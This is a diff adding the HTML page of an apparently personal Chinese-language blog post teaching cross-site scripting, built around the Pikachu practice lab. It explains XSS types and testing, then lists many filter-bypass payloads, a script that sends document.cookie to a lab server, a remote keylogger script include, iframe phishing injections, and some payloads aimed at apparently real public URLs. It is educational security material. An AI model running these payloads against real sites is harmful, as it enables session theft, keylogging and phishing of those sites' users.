@@ -1,0 +1,377 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="future.zhangyan">
+
+
+
+    <meta name="description" content="未来可期">
+
+
+
+<title>XSS跨站脚本攻击 | Hexo</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 5.1.1"></head>
+
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">张艳&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/categories">Categories</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">张艳&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/categories">Categories</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">XSS跨站脚本攻击</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">future.zhangyan</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">September 12, 2020&nbsp;&nbsp;20:04:03</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h2 id="xss总结图"><a href="#xss总结图" class="headerlink" title="xss总结图"></a>xss总结图</h2><p><img src="/image/%E8%84%91%E5%9B%BE/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB.png"></p>
+<h2 id="xss攻击图"><a href="#xss攻击图" class="headerlink" title="xss攻击图"></a>xss攻击图</h2><p><img src="/image/xss/xss%E6%94%BB%E5%87%BB%E5%9B%BE.jpg"></p>
+<h2 id="一、什么是-XSS"><a href="#一、什么是-XSS" class="headerlink" title="一、什么是 XSS"></a>一、什么是 XSS</h2><p>XSS全称（Cross Site Scripting）跨站脚本攻击，是最常见的Web应用程序安全漏洞之一。XSS是指攻击者在网页中嵌入客户端脚本，通常是JavaScript编写的危险代码，当用户使用浏览器浏览网时，脚本就会在用户的浏览器上执行，从而达到攻击者的目的。</p>
+<h2 id="二、XSS漏洞出现的原因"><a href="#二、XSS漏洞出现的原因" class="headerlink" title="二、XSS漏洞出现的原因"></a>二、XSS漏洞出现的原因</h2><p>程序对输入和输出的控制不够严格,导致”精心构造“的脚本输入后,在输到前端时被浏览器当作有效代码解析执行从而产生危害.</p>
+<h2 id="三、XSS的危害"><a href="#三、XSS的危害" class="headerlink" title="三、XSS的危害"></a>三、XSS的危害</h2><p>1、首先对于那些半年没有更新的小企业网站来说，发生XSS漏洞几乎没有什么用。一般在各类的社交平台，邮件系统，开源流行的Web应用，BBS，微博等场景中，造成的杀伤力却十分强大。<br>2、劫持用户cookie是最常见的跨站攻击形式，通过在网页中写入并执行脚本执行文件（多数情况下是JavaScript脚本代码），劫持用户浏览器，将用户当前使用的sessionID信息发送至攻击者控制的网站或服务器中。<br>3、“框架钓鱼”。利用JS脚本的基本功能之一：操作网页中的DOM树结构和内容，在网页中通过JS脚本，生成虚假的页面，欺骗用户执行操作，而用户所有的输入内容都会被发送到攻击者的服务器上。<br>4、挂马（水坑攻击）<br>5、有局限性的键盘记录</p>
+<h2 id="四、-XSS分类"><a href="#四、-XSS分类" class="headerlink" title="四、 XSS分类"></a>四、 XSS分类</h2><p>1、反射型XSS或不持久型XSS(中危)<br>交互的数据一般不会被存在在数据库里面,只是简单的把用户输入的数据反射给浏览器，一次性，所见即所得。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line"></span><br><span class="line">&#39;&quot;&gt;&lt;sCrIpT&gt;alert(63252)&lt;&#x2F;sCrIpT&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">_GET[&#39;name&#39;];</span><br><span class="line"></span><br><span class="line">echo &quot;Welcome $name</span><br><span class="line"></span><br><span class="line">&quot;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>2、储存型XSS 或持久型 XSS（高危）<br>交互的数据会被存在在数据库里面,永久性存储,具有很强的稳定性</p>
+<p>3、DOM XSS<br>不与后台服务器产生数据交互,通过前端的dom节点形成的XSS漏洞。<br>什么是DOM:DOM全称是Document Object Model，也就是文档对象模型。我们可以将DOM理解为，一个与系统平台和编程语言无关的接口，程序和脚本可以通过这个接口动态地访问和修改文档内容、结构和样式。当创建好一个页面并加载到浏览器时，DOM就悄然而生，它会把网页文档转换为一个文档对象，主要功能是处理网页内容。故可以使用 Javascript 语言来操作DOM以达到网页的目的。<br><a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=https://www.w3school.com.cn/htmldom/index.asp">https://www.w3school.com.cn/htmldom/index.asp</a><br><code>&lt;a href=&#39;&quot;+str+&quot;&#39;&gt;what do you see?&lt;/a&gt;</code><br><code>&lt;a href=&#39;#&#39; onclick=&quot;alert(1111)&quot;&gt;what do you see?&lt;/a&gt;</code><br><code>&lt;a href=&#39;#&#39; onclick=&quot;alert(2222)&quot;&gt;what do you see?&lt;/a&gt;</code></p>
+<h2 id="五、XSS可能存在的地方"><a href="#五、XSS可能存在的地方" class="headerlink" title="五、XSS可能存在的地方"></a>五、XSS可能存在的地方</h2><p>HTML context<br>Attribute Context<br>URL Context<br>Style Context<br>Script Context</p>
+<h2 id="六、XSS测试方法"><a href="#六、XSS测试方法" class="headerlink" title="六、XSS测试方法"></a>六、XSS测试方法</h2><p>1、工具扫描：APPscan、AWVS<br>2、手工测试：Burpsuite、firefox(hackbar)、XSSER XSSF<br>使用手工检测Web应用程序是否存在XSS漏洞时，最重要的是考虑那里有输入，输入的数据在什么地方输出。在进行手工检测XSS时，人毕竟不像软件那样不知疲惫，所以一定要选择有特殊意义的字符，这样可以快速测试是否存在XSS。<br>（1）在目标站点上找到输入点,比如查询接口,留言板等;<br>（2）输入一组”特殊字符+唯一识别字符”,点击提交后,查看返回的源码,是否有做对应的处理;<br>（3）通过搜索定位到唯一字符,结合唯一字符前后语法确认是否可以构造执行js的条件(构造闭合);提交构造的脚本代码,看是否可以成功执行,如果成功执行则说明存在XSS漏洞;</p>
+<h2 id="七、实战"><a href="#七、实战" class="headerlink" title="七、实战"></a>七、实战</h2><p>1、xss平台搭建及后台使用（cookie获取）<br><code>&#39;&quot;&gt;&lt;script&gt;document.location = &#39;http://192.168.0.113/pikachu/pkxss/xcookie/cookie.php?cookie=&#39; + document.cookie;&lt;/script&gt;</code></p>
+<p>//通过document.location 实例进行重定向到<a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=http://127.0.0.1/pikachu/index.php">http://127.0.0.1/pikachu/index.php</a><br>php版本影响实验结果</p>
+<p>2、反射型XSS(POST)获取用户密码<br>post攻击利用页面   D:\phpStudy\WWW\pikachu\pkxss\xcookie\post.html<br><a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=http://192.168.0.113:80/post.html">http://192.168.0.113:80/post.html</a></p>
+<p>3、xss钓鱼演示<br>钓鱼攻击利用页面   E:\phpStudy\WWW\pikachu\pkxss\xfish</p>
+<p>4、xss获取键盘记录演示</p>
+<p>(1)、什么是跨域</p>
+<p>​    http:// www.   oldboyedu.com  :80 /   news/index.php</p>
+<p>协议  子域名        主域名         端口资源地址</p>
+<p>​    当协议、主机(主域名，子域名)、端口中的任意一个不相同时，称为不同域。我们把不同的域之间请求数据的操作，成为跨域操作。</p>
+<p>(2)、同源策略</p>
+<p>​    为了安全考虑，所有浏览器都约定了“同源策略”，同源策略禁止页面加载或执行与自身来源不同的域的任何脚本既不同域之间不能使用JS进行操作。比如：x.com域名下的js不能操作y.com域名下的对象</p>
+<p>​    那么为什么要有同源策略？ 比如一个恶意网站的页面通过js嵌入了银行的登录页面（二者不同源），如果没有同源限制，恶意网页上的javascript脚本就可以在用户登录银行的时候获取用户名和密码。</p>
+<p>Tips:下面这些标签跨域加载资源(资源类型是有限止的)是不受同源策略限制的</p>
+<p><code>&lt;script src=&quot;...&quot;&gt;</code>  //加载本地js执行</p>
+<p><code>&lt;img src=&quot;C:/blog/source/_posts/...&quot;&gt;  </code>//图片</p>
+<p><code>&lt;link href=&quot;...&quot;&gt;</code>  //css</p>
+<p><code>&lt;iframe src=&quot;...&quot;&gt;</code>  //任意资源</p>
+<p>(3)、同源策略修改</p>
+<p>​    E:\phpStudy\WWW\pikachu\pkxss\rkeypress\rkserver.php</p>
+<p>​    同之前的案例到后台设置好Access-Control-Allow-Origin，设置为*，既允许所有人访问。</p>
+<p>(4）rk.js关键代码解读</p>
+<p>​    var realkey = String.fromCharCode(event.keyCode);  //获取用户键盘记录，最后转化为字符串</p>
+<p>​    xl+=realkey;   //赋值给x1</p>
+<p>​    show();    //调用show函数，通过下面ajax进行post发送键盘记录人内容</p>
+<p>输入设置好的恶意JS代码：</p>
+<p><code>&lt;script src=&quot;http://192.168.3.60/pikachu/pkxss/rkeypress/rk.js&quot;&gt;&lt;/script&gt;</code></p>
+<p>然后在键盘上随意输入，就可以到xss平台上去查看键盘输入的结果</p>
+<h2 id="八、xss如何绕过及安全防范"><a href="#八、xss如何绕过及安全防范" class="headerlink" title="八、xss如何绕过及安全防范"></a>八、xss如何绕过及安全防范</h2><p>多数网站为了避免xss的攻击，对于攻击者的输入都采取了过滤的措施，导致攻击者通常不能正常插入恶意代码来达到攻击目的。但是仍存在一些漏洞可以利用，来绕过过滤措施。</p>
+<p>​    xss绕过的方法有许多，主要取决于攻击者的思路和对前端技术的掌握，以下介绍几个简单的绕过方法。</p>
+<p>（1）对前端的限制可以尝试进行抓包重发或者修改前端的HTML。</p>
+<p>（2）防止后台对输入的内容进行正则匹配来过滤输入，对于这样的过滤可以考虑大小写混合输入的方法。</p>
+<p> 例：<code>&#39;&quot;&gt;&lt;sCrIpT&gt;alert(63252)&lt;/sCrIpT&gt;</code></p>
+<p>（3）防止后台对输入的内容进行替换，采用拼拼凑的输入方法。</p>
+<p> 例：<code>&lt;sc&lt;script&gt;ript&gt;alert(&#39;你打篮球像oldboy&#39;)&lt;/scr&lt;script&gt;ipt&gt;</code></p>
+<p>（4）使用注释来干扰后台对输入内容的识别。</p>
+<p> 例：<code>&lt;sc&lt;!--test--&gt;ript&gt;alert(&#39;你打篮球像oldboy&#39;)&lt;/scr&lt;!--tshauie--&gt;ipt&gt;</code></p>
+<p>（5）编码</p>
+<p> 思路：后台有可能会对代码中的关键字进行过滤，但我们可以尝试将关键字进行编码后在插入，浏览器对改编码进行识别时，会翻译成正常的代码。（注意：编码在输出时是否会被正常识别和翻译才是关键，不是所有的编码都是可以的）</p>
+<p>  例：使用事件属性onerror():</p>
+<p><code>&lt;img src=# onerror=&quot;alert(&#39;oldboy&#39;)&quot;/&gt;</code></p>
+<p>​    使用HTML进行编码：</p>
+<p>` &lt;img src=x</p>
+<p>onerror=”&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#121;&#97;&#110;&#103;&#115;&#104;&#117;&#97;&#110;&#103;&#39;&#41;”/&gt;`</p>
+<p> （6）样式绕过</p>
+<p>`&lt;div style=”color: ‘&lt;’; color:</p>
+<p>expression(alert(‘XSS’))”&gt;`</p>
+<p>(7)XSS绕过之htmlspecialchars()函数</p>
+<p>htmlspecialchars()函数把一些预定义的字符转换为 HTML 实体。yangshiy</p>
+<p>预定义的字符是：</p>
+<p> &amp; (和号)成为 &amp;amp</p>
+<p> “ (双引号)成为 &amp;quot</p>
+<p> ’ (单引号)成为&amp;#039</p>
+<p> &lt;(小于)成为 &amp;lt</p>
+<p><code>&gt;</code>(大于)成为 &amp;gt</p>
+<p>该函数的语法：htmlspecialchars(string,flags,character-set,double_encode)</p>
+<p>过滤原理：htmlspecialchars() 函数把预定义的字符转换为 HTML 实体，从而使XSS攻击失效。但是这个函数默认配置不会将单引号和双引号过滤，只有设置了quotestyle规定如何编码单引号和双引号才能会过滤掉单引号</p>
+<p>可用的quotestyle类型：</p>
+<p>ENT_COMPAT - 默认。仅编码双引号</p>
+<p>ENT_QUOTES - 编码双引号和单引号</p>
+<p>ENT_NOQUOTES - 不编码任何引号</p>
+<p>可使用以下语句绕过：  q’ onclick=’alert(111)’</p>
+<p> (8) xss之href输出绕过：javascript:alert(1111)直接代入a标签herf里面一样可以绕过htmlspecialchars</p>
+<p> (9) xss之js输出绕过：<code>1&#39;&lt;/script&gt;&lt;script&gt;alert(1111)&lt;/script&gt;</code></p>
+<p> 思路：后台有可能会对代码中的关键字进行过滤，但我们可以尝试将关键字进行编码后在插入，浏览器对改编码进行识别时，会翻译成正常的代码。（注意：编码在输出时是否会被正常识别和翻译才是关键，不是所有的编码都是可以的）</p>
+<p>phpstudy配置伪静态</p>
+<p><a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=https://jingyan.baidu.com/article/e9fb46e151a6557521f766d6.html">https://jingyan.baidu.com/article/e9fb46e151a6557521f766d6.html</a></p>
+<p>伪静态注入的总结</p>
+<p><a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=https://www.cnblogs.com/jsq16/p/5942003.html">https://www.cnblogs.com/jsq16/p/5942003.html</a></p>
+<h2 id="XSS盲打"><a href="#XSS盲打" class="headerlink" title="XSS盲打"></a>XSS盲打</h2><p>XSS盲打就是攻击者在前端提交的数据不知道后台是否存在xss漏洞的情况下，提交恶意JS代码在类似留言板等输入框后，所展现的后台位置的情况下，网站采用了攻击者插入的恶意代码，当后台管理员在操作时就会触发插入的恶意代码，从而达到攻击者的目的。例如输入：</p>
+<p><code>&#39;&quot;&gt;&lt;sCrIpT&gt;alert(63252)&lt;/sCrIpT&gt;</code></p>
+<hr>
+<p>管理员后台：  <a target="_blank" rel="noopener" href="http://http//192.168.0.113/pikachu/vul/xss/xssblind/admin_login.php">http://http://192.168.0.113/pikachu/vul/xss/xssblind/admin_login.php</a> </p>
+<h2 id="跨站语句"><a href="#跨站语句" class="headerlink" title="跨站语句"></a>跨站语句</h2><p><code>&#39;&quot;&gt;&lt;sCrIpT&gt;alert(63252)&lt;/sCrIpT&gt; </code>  大小写绕过<br><code>&#39;&quot;&gt;&lt;IFRAME SRC=javascript:alert(&#39;XSXSSSs&#39;)&gt;&lt;/IFRAME&gt;</code><br><code>&lt;scr&lt;script&gt;ipt&gt;alert(&quot;XXSSSS&quot;)&lt;/scr&lt;/script&gt;ipt&gt;</code>  过滤script绕过<br><code>&lt;img src=&quot;&quot;onerror=&quot;alert(&#39;xss&#39;)&quot;&gt; </code>  直接k掉script绕过<br><code>&lt;script&gt;eval(string.fromcharcode(97,108,101,114,116,40,39,120,115,115,39,41))&lt;/script&gt;  </code>包含alert就绕过（括号一串数字是alert(xss)的ASCII值）<br><code>&lt;/script&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>  构造js绕过<br>‘;alert(‘xss’);’   htmlentities没有过滤单引号，直接用单引号绕过。<br><code>..../example8.php/[/url]&#39;&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt; &quot;&lt;</code>   当post 地址使用了当前url的时候，可这样绕过<br><code>..../example9.php#&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt; </code> 通过构造一个带xss的锚点绕过<br><code>&lt;script&gt;1&lt;(br=1)*/%0dalert(1)&lt;/script&gt;=&lt;script&gt;1&lt;(br=1)*/&lt;br/&gt;</code>alert(1)</script>   过chrome默认xss过滤器<br><a target="_blank" rel="noopener" href="http://54.222.168.105:8065/?error=email%E9%94%99%E8%AF%AF%3C/script%3E%3Cscript%3E1%3C(br=1)*/%0Deval(atob(location.hash.substr(1)))%3C/script%3E#xxxxxx">http://54.222.168.105:8065/?error=email%E9%94%99%E8%AF%AF%3C/script%3E%3Cscript%3E1%3C(br=1)*/%0deval(atob(location.hash.substr(1)))%3C/script%3E#xxxxxx</a></p>
+<p>%22Onclick%3D(outerHTML%3DURL)|%26quot#&lt;img/src=# onerror=alert()&gt;<br>%27%29%0D%0Aalert%28document.cookie%29%2F%2F</p>
+<p><code>&lt;script&gt;alert(&quot;跨站&quot;)&lt;/script&gt;</code>    (最常用）<br><code>&lt;img scr=javascript:alert(&quot;跨站&quot;)&gt;&lt;/img&gt;</code></p>
+<p><a target="_blank" rel="noopener" href="http://www.example.com/MyApp.aspx?myvar=">http://www.example.com/MyApp.aspx?myvar=</a> “&gt;&lt;/XSS/*-*/STYLE=xss:e/**/xpression(alert(‘XSS’))&gt;</p>
+<p><code>&lt;IFRAME SRC=javascript:alert(&#39;test&#39;)&gt;&lt;/IFRAME&gt;</code><br>“ onclick=”alert(1)”<br><code>&lt;img scr=&quot;javascrip&amp;#116&amp;#58 alert(/跨站/)&gt;&lt;/img&gt;</code><br><code>&lt;img scr=&quot;javas????cript:alert(/跨站/)&quot; width=150&gt;&lt;/img&gt;</code> (?用tab键弄出来的空格）<br><code>&lt;img scr=&quot;#&quot; onerror=alert(/跨站/)&gt;&lt;/img&gt;</code><br><code>&lt;img scr=&quot;#&quot; style=&quot;xss:expression(alert(/xss/));&quot;&gt;&lt;/img&gt;</code><br><code>&lt;img scr=&quot;#&quot;/* */onerror=alert(/xss/) width=150&gt;&lt;/img&gt;</code> (/**/ 表示注释）<br><code>&lt;img src=vbscript:msgbox (&quot;xss&quot;)&gt;&lt;/img&gt;</code><br><code>&lt;style&gt; input &#123;left:expression (alert(&#39;xss&#39;))&#125;&lt;/style&gt;</code><br><code>&lt;div style=&#123;left:expression (alert(&#39;xss&#39;))&#125;&gt;&lt;/div&gt;</code><br><code>&lt;div style=&#123;left:exp/* */ression (alert(&#39;xss&#39;))&#125;&gt;&lt;/div&gt;</code><br><code>&lt;div style=&#123;left:\0065\0078ression (alert(&#39;xss&#39;))&#125;&gt;&lt;/div&gt;</code><br>html 实体 <code>&lt;div style=&#123;left:&amp;#ｘ0065；xpression (alert(&#39;xss&#39;))&#125;&gt;&lt;/div&gt;</code><br>unicode <code>&lt;div style=&quot;&#123;left:expRessioN (alert(&#39;xss&#39;))&#125;&quot;&gt;</code></p>
+<p><code>&quot;]&#125;%3Cscript%3Ealert(&#39;By b14ckb0y&#39;)%3C/script%3E&#123;[&amp;item=&quot;]&lt;iframe%20src=http://new.qzone.qq.com/9530772%20width=400%20height=600&gt;&lt;/iframe&gt;[&quot;</code></p>
+<p>/peixun/Search.asp?Field=&amp;Keyword=&amp;ClassID=0&amp;page=2<br><code>/peixun/Search.asp?Field=&#39;/&gt;&lt;script&gt;alert(451)&lt;/script&gt;&amp;Keyword=&amp;ClassID=0&amp;page=2</code></p>
+<p>Referer: <code>&#39;&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(312)&lt;/script&gt; </code> 传送头插入</p>
+<p>/peixun/Search.asp?Field=%27%22%3E%3Ciframe+id%3D445+src%3Dhttp%3A%2F%2Fdemo.testfire.net%2Fphishing.html%3E</p>
+<p><code>/peixun/Search.asp?Field=&#39;&quot;&gt;&lt;iframe id=445 src=http://demo.testfire.net/phishing.html&gt;</code></p>
+<p><code>&lt;script src=&quot;http://192.168.1.55:8080/xssing-master/?u=f389c3&quot; &gt; &lt;/script&gt; </code><br><code>&lt;script&gt;document.location=(&#39;http://www.baidu.com&#39;)&lt;/script&gt; </code><br><code>&lt;script&gt;document.write(&#39;&lt;iframe src=http://www.baidu.com  width=0 height=0&gt;&lt;/iframe&gt;&#39;);&lt;/script&gt; </code></p>
+<p>/user/User_Message.asp?Action=Manage&amp;ManageType=Inbox&amp;Field=Content%22%3e%3c%73%43%72%49%70%54%3e%61%6c%65%72%74%28%35%38%34%38%33%29%3c%2f%73%43%72%49%70%54%3e </p>
+<p><code>&lt;input id=&quot;Submit&quot; type=&quot;submit&quot; value=&quot;保存修改结果&quot; onclick=&quot;alert(1)&quot;/&gt; &lt; name=&quot;Submit&quot;&gt;</code></p>
+<p><a target="_blank" rel="noopener" href="http://www.xx.com/netsearch_pre.jsp?netname=1&quot;">http://www.xx.com/netsearch_pre.jsp?netname=1&quot;</a> onmouseenter=”prompt(/csits/)</p>
+<p>url=%0aX-XSS-Protection:%200%0a%0d%0a%0d&lt;img%20src=1%20onerror=alert(/xss/)&gt;</p>
+<p><a target="_blank" rel="noopener" href="http://edu.gf.com.cn/simulate?type=simulate_open&amp;category=%3Cimg%20src=@%20onmouseover=confirm(/xssme27/)%3E">http://edu.gf.com.cn/simulate?type=simulate_open&amp;category=%3Cimg%20src=@%20onmouseover=confirm(/xssme27/)%3E</a></p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>future.zhangyan</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://zhangyanlady.github.io/2020/09/12/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/">https://zhangyanlady.github.io/2020/09/12/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>The future can be expected, the world is worth it.</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"># 网络安全</a>
+                    
+                        <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"># 渗透测试</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2020/09/12/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E3%80%81%E4%B8%8B%E8%BD%BD/">文件上传、下载</a>
+            
+            
+            <a class="next" rel="next" href="/2020/09/12/PHP%E5%8F%8Amysql%E6%95%B0%E6%8D%AE%E5%BA%93/">PHP及mysql数据库</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© future.zhangyan | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
